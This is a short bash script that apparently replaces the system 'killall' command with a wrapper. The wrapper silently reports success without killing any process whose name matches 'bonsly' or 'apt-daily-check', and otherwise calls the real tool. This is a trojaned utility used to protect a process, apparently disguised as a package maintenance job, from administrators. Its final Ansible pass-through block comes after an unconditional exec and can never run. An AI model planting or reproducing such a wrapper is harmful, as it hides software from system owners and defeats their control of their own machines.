#!/bin/bash
REAL_KILLALL="/usr/bin/killall"

BLOCKED_PATTERNS=("bonsly" "apt-daily-check")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 0
        fi
    done
done

exec $REAL_KILLALL "$@"

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_KILLALL "$@"
fi
